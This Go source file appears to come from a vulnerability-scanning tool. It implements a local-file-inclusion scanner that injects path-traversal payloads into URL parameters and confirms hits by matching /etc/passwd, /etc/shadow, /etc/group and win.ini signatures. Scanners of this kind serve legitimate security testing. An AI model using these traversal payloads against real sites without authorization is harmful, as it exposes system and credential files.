package scanner

import (
	"bugx/pkg/utils"
	"crypto/rand"
	"encoding/hex"
	"fmt"
	nurl "net/url"
	"strings"
	"sync"
)

type LFIScanner struct{}

// File signatures that CONFIRM LFI - STRICT patterns only
// These patterns are designed to be extremely specific to avoid false positives
// Minimum match requirements and required patterns ensure accuracy
var fileSignatures = map[string]struct {
	Patterns       []string
	OS             string
	File           string
	MinMatchCount  int    // Minimum patterns that must match for confirmation
	RequirePattern string // Optional: This pattern MUST be present
}{
	"etc_passwd": {
		// ONLY patterns that are UNIQUE to /etc/passwd format
		// Format: username:password:UID:GID:GECOS:home:shell
		Patterns: []string{
			"root:x:0:0:",             // root with x password placeholder
			"root:*:0:0:",             // root with * password placeholder
			"daemon:x:1:1:",           // Standard daemon user
			"bin:x:2:2:",              // Standard bin user
			"nobody:x:65534:",         // nobody with high UID
			"nobody:x:99:",            // nobody on some systems
			"sys:x:3:3:",              // sys user
			"games:x:5:60:",           // games user
			"mail:x:8:12:",            // mail user
			"www-data:x:33:33:",       // www-data with specific UID:GID
			"sshd:x:",                 // sshd service user
			"mysql:x:",                // mysql service user
			"postgres:x:",             // postgres service user
			":0:0:root:/root:/bin/",   // Full root line pattern
			":1:1:daemon:/usr/sbin:/", // Full daemon line pattern
		},
		OS:             "Linux",
		File:           "/etc/passwd",
		MinMatchCount:  4,             // Must match at least 4 SPECIFIC patterns
		RequirePattern: "root:x:0:0:", // Most common root format MUST be present
	},
	"etc_shadow": {
		// Shadow file has very specific hash formats
		Patterns: []string{
			"root:$1$",        // MD5 hash (rarely used now)
			"root:$5$",        // SHA-256 hash
			"root:$6$",        // SHA-512 hash (most common)
			"root:$y$",        // yescrypt (modern)
			"root:!:",         // Locked account
			"daemon:*:",       // Daemon locked
			"bin:*:",          // Bin locked
			"nobody:*:",       // Nobody locked
			":::0:99999:7:::", // Shadow format with expiry fields
		},
		OS:             "Linux",
		File:           "/etc/shadow",
		MinMatchCount:  3,        // Must match 3 patterns
		RequirePattern: "root:$", // Most likely format for readable shadow
	},
	"win_ini": {
		// Windows win.ini is VERY minimal in modern Windows
		// STRICT: These patterns must appear TOGETHER to confirm
		// A typical win.ini contains EXACTLY these lines in this order:
		// ; for 16-bit app support
		// [fonts]
		// [extensions]
		// [mci extensions]
		// [files]
		// [Mail]
		// MAPI=1
		Patterns: []string{
			"; for 16-bit app support", // UNIQUE: This exact comment line
			"[fonts]\r\n[extensions]",  // Consecutive sections (CRLF)
			"[fonts]\n[extensions]",    // Consecutive sections (LF)
			"[mci extensions]",         // This specific section name with space
			"[Mail]\r\nMAPI=1",         // Mail section followed by MAPI (CRLF)
			"[Mail]\nMAPI=1",           // Mail section followed by MAPI (LF)
		},
		OS:             "Windows",
		File:           "C:\\Windows\\win.ini",
		MinMatchCount:  3,                          // Must match 3 pattern combinations
		RequirePattern: "; for 16-bit app support", // This EXACT line must be present
	},
	// REMOVED: php_source - too many false positives from documentation/tutorials
	// PHP source detection should only be via php://filter with base64 verification
	"etc_group": {
		// /etc/group format: groupname:password:GID:members
		Patterns: []string{
			"root:x:0:",      // Root group
			"daemon:x:1:",    // Daemon group
			"bin:x:2:",       // Bin group
			"sys:x:3:",       // Sys group
			"adm:x:4:",       // Adm group
			"tty:x:5:",       // TTY group
			"disk:x:6:",      // Disk group
			"wheel:x:10:",    // Wheel group (sudo)
			"sudo:x:",        // Sudo group
			"www-data:x:33:", // www-data with specific GID
			"shadow:x:42:",   // Shadow group
			"utmp:x:43:",     // Utmp group
		},
		OS:             "Linux",
		File:           "/etc/group",
		MinMatchCount:  5,           // Must match at least 5 group entries
		RequirePattern: "root:x:0:", // Root group MUST be present
	},
}

// LFI payloads targeting known files
var lfiPayloads = []struct {
	Payload      string
	TargetFile   string
	SignatureKey string
}{
	// Linux /etc/passwd
	{"../../../etc/passwd", "/etc/passwd", "etc_passwd"},
	{"....//....//....//etc/passwd", "/etc/passwd", "etc_passwd"},
	{"..%2f..%2f..%2fetc%2fpasswd", "/etc/passwd", "etc_passwd"},
	{"..%252f..%252f..%252fetc%252fpasswd", "/etc/passwd", "etc_passwd"},
	{"/etc/passwd", "/etc/passwd", "etc_passwd"},
	{"....//....//....//....//etc/passwd", "/etc/passwd", "etc_passwd"},
	{"..\\..\\..\\etc\\passwd", "/etc/passwd", "etc_passwd"},
	{"/etc/passwd%00", "/etc/passwd", "etc_passwd"},
	{"../../../etc/passwd%00.jpg", "/etc/passwd", "etc_passwd"},

	// Linux /etc/group (secondary verification target)
	{"../../../etc/group", "/etc/group", "etc_group"},
	{"....//....//....//etc/group", "/etc/group", "etc_group"},
	{"/etc/group", "/etc/group", "etc_group"},

	// Windows win.ini
	{"..\\..\\..\\windows\\win.ini", "win.ini", "win_ini"},
	{"....//....//....//windows/win.ini", "win.ini", "win_ini"},
	{"C:\\Windows\\win.ini", "win.ini", "win_ini"},
	{"/windows/win.ini", "win.ini", "win_ini"},
	{"..%5c..%5c..%5cwindows%5cwin.ini", "win.ini", "win_ini"},

	// REMOVED: PHP wrappers - too many false positives without proper base64 decode verification
	// php://filter detection requires decoding base64 and checking for actual PHP code
}

func (s *LFIScanner) Scan(config ScanConfig) []ScanResult {
	var processor ResultProcessor
	var wg sync.WaitGroup
	sem := make(chan struct{}, config.Threads)

	fmt.Println(utils.Yellow("\n[i] Starting LFI Scan..."))
	fmt.Println(utils.White("[*] Verifying by checking actual file content signatures"))
	fmt.Println(utils.White("[*] Only CONFIRMED file inclusions will be reported\n"))

	// Generate unique canary for false positive detection
	canaryBytes := make([]byte, 8)
	rand.Read(canaryBytes)
	canary := hex.EncodeToString(canaryBytes)

	for _, url := range config.URLs {
		// Get baseline
		baseline, err := utils.MakeRequest(url+"test_nonexistent_"+canary, config.Cookie, config.Timeout)
		if err != nil {
			continue
		}

		// Use built-in payloads + user payloads
		payloadsToTest := lfiPayloads

		for _, lfiPayload := range payloadsToTest {
			wg.Add(1)
			sem <- struct{}{}
			go func(u string, payload struct {
				Payload      string
				TargetFile   string
				SignatureKey string
			}) {
				defer wg.Done()
				defer func() { <-sem }()

				// Fuzzing Logic:
				// If URL has parameters (e.g. ?file=image.jpg), we MUST replace the value (e.g. ?file=../../etc/passwd)
				// instead of appending (which results in ?file=image.jpg../../etc/passwd -> Invalid).
				// We also keep the 'append' strategy as a fallback for RESTful URLs or raw appends.

				var targets []string

				// 1. Try Parameter Replacement (The Fix)
				parsedURL, err := nurl.Parse(u)
				if err == nil && len(parsedURL.Query()) > 0 {
					// Manually modify RawQuery to preserve payload formatting (avoiding extra URL encoding of ../)
					rawQuery := parsedURL.RawQuery
					params := strings.Split(rawQuery, "&")
					for i, param := range params {
						// Split key=value
						kv := strings.SplitN(param, "=", 2)
						key := kv[0]

						// Construct new query: key=PAYLOAD
						// We replace the logic to inject payload specifically into this parameter
						newParams := make([]string, len(params))
						copy(newParams, params)
						newParams[i] = key + "=" + payload.Payload

						// Rebuild URL
						fuzzedURL := *parsedURL
						fuzzedURL.RawQuery = strings.Join(newParams, "&")
						targets = append(targets, fuzzedURL.String())
					}
				}

				// 2. Fallback / Original Strategy: Simple Append
				// Useful for URLs like http://site.com/file= (empty) or manual fuzz points
				targets = append(targets, u+payload.Payload)

				// Deduplicate
				uniqueTargets := make(map[string]bool)
				var finalTargets []string
				for _, t := range targets {
					if !uniqueTargets[t] {
						uniqueTargets[t] = true
						finalTargets = append(finalTargets, t)
					}
				}

				for _, targetURL := range finalTargets {
					resp, err := utils.MakeRequest(targetURL, config.Cookie, config.Timeout)
					if err != nil {
						continue
					}

					// 1. Status Code Check: If we get a 200 OK while baseline (non-existent) was 404/500, that's interesting.
					// But if baseline was 200 (soft 404), we rely on content difference.
					statusCodeMatch := resp.StatusCode == baseline.StatusCode

					// 2. Length/Content Check:
					// If status codes match, we need significant content difference.
					// If status codes differ (e.g. 404 vs 200), we proceed to signature check.
					if statusCodeMatch {
						// Use a simple ratio or just strict length diff if status matches
						// If bodies are identical size, it's definitely not it.
						if len(resp.Body) == len(baseline.Body) {
							return
						}
						// If the difference is very small (less than 5 chars), likely just dynamic time/date
						diff := len(resp.Body) - len(baseline.Body)
						if diff < 0 {
							diff = -diff
						}
						if diff < 5 {
							continue
						}
					}

					// Verify with file signatures
					sig, exists := fileSignatures[payload.SignatureKey]
					if !exists {
						continue
					}

					// Check for required pattern FIRST
					if sig.RequirePattern != "" && !strings.Contains(resp.Body, sig.RequirePattern) {
						continue // Required pattern not found, skip
					}

					// Check that patterns are NOT in baseline (avoid false positives)
					baselineHasPatterns := 0
					for _, pattern := range sig.Patterns {
						if strings.Contains(baseline.Body, pattern) {
							baselineHasPatterns++
						}
					}
					// If baseline already has 2+ patterns, this is likely a false positive
					if baselineHasPatterns >= 2 {
						continue
					}

					matchedPatterns := 0
					for _, pattern := range sig.Patterns {
						if strings.Contains(resp.Body, pattern) {
							matchedPatterns++
						}
					}

					// Use MinMatchCount from signature, default to 2 for backwards compatibility
					minRequired := sig.MinMatchCount
					if minRequired == 0 {
						minRequired = 2
					}

					// Need pattern matches for confirmation
					if matchedPatterns >= minRequired {
						fmt.Printf("%s %s\n",
							utils.Red("[✓] LFI CONFIRMED:"),
							utils.Cyan(targetURL))
						fmt.Printf("    → File: %s (%s), Matched patterns: %d/%d required\n",
							utils.Yellow(sig.File),
							utils.White(sig.OS),
							matchedPatterns,
							minRequired)

						processor.Add(ScanResult{
							URL:        targetURL,
							Vulnerable: true,
							Payload:    payload.Payload,
							Details:    fmt.Sprintf("LFI - %s file included (%s)", sig.File, sig.OS),
						})
					}

					// Special check for PHP base64 wrapper
					if payload.SignatureKey == "php_source" {
						// Check for base64 encoded PHP
						if isBase64PHPSource(resp.Body) {
							fmt.Printf("%s %s\n",
								utils.Red("[✓] LFI CONFIRMED (PHP Source Disclosure):"),
								utils.Cyan(targetURL))
							fmt.Printf("    → Base64 encoded PHP source code detected\n")

							processor.Add(ScanResult{
								URL:        targetURL,
								Vulnerable: true,
								Payload:    payload.Payload,
								Details:    "LFI - PHP source code disclosure via php://filter",
							})
						}
					}

				} // Close finalTargets loop
			}(url, lfiPayload)
		}

		// Also test user-provided payloads
		for _, userPayload := range config.Payloads {
			wg.Add(1)
			sem <- struct{}{}
			go func(url, payload string) {
				defer wg.Done()
				defer func() { <-sem }()

				targetURL := url + payload
				resp, err := utils.MakeRequest(targetURL, config.Cookie, config.Timeout)
				if err != nil {
					return
				}

				// Check all file signatures
				for sigKey, sig := range fileSignatures {
					if sigKey == "php_source" {
						continue // Skip PHP source for user payloads
					}

					matchedPatterns := 0
					for _, pattern := range sig.Patterns {
						if strings.Contains(resp.Body, pattern) {
							matchedPatterns++
						}
					}

					if matchedPatterns >= 2 {
						fmt.Printf("%s %s\n",
							utils.Red("[✓] LFI CONFIRMED:"),
							utils.Cyan(targetURL))
						fmt.Printf("    → File: %s (%s), Matched patterns: %d\n",
							utils.Yellow(sig.File),
							utils.White(sig.OS),
							matchedPatterns)

						processor.Add(ScanResult{
							URL:        targetURL,
							Vulnerable: true,
							Payload:    payload,
							Details:    fmt.Sprintf("LFI - %s file included (%s)", sig.File, sig.OS),
						})
						return
					}
				}
			}(url, userPayload)
		}
	}

	wg.Wait()
	printLFISummary(processor.Results)
	return processor.Results
}

// isBase64PHPSource checks if the response contains base64-encoded PHP
func isBase64PHPSource(body string) bool {
	// Base64 patterns that indicate PHP source
	phpBase64Indicators := []string{
		"PD9waHA", // <?php
		"PD89",    // <?=
		"Pz4=",    // ?>
	}

	for _, indicator := range phpBase64Indicators {
		if strings.Contains(body, indicator) {
			return true
		}
	}
	return false
}

func printLFISummary(results []ScanResult) {
	linux, windows, php := 0, 0, 0
	for _, r := range results {
		if strings.Contains(r.Details, "Linux") {
			linux++
		} else if strings.Contains(r.Details, "Windows") {
			windows++
		} else if strings.Contains(r.Details, "PHP") {
			php++
		}
	}

	fmt.Println(utils.Yellow("\n--------------------------------------------------"))
	fmt.Println(utils.White("LFI Scan Summary:"))
	fmt.Printf("  %s Linux files: %d\n", utils.Red("●"), linux)
	fmt.Printf("  %s Windows files: %d\n", utils.Red("●"), windows)
	fmt.Printf("  %s PHP source disclosure: %d\n", utils.Red("●"), php)
	fmt.Printf("  %s Total CONFIRMED: %d\n", utils.Green("★"), len(results))
	fmt.Println(utils.Yellow("--------------------------------------------------"))

	if len(results) > 0 {
		fmt.Println(utils.Green("\n[!] All findings are VERIFIED - actual file content confirmed!"))
	} else {
		fmt.Println(utils.Yellow("\n[i] No confirmed LFI vulnerabilities found."))
	}
}
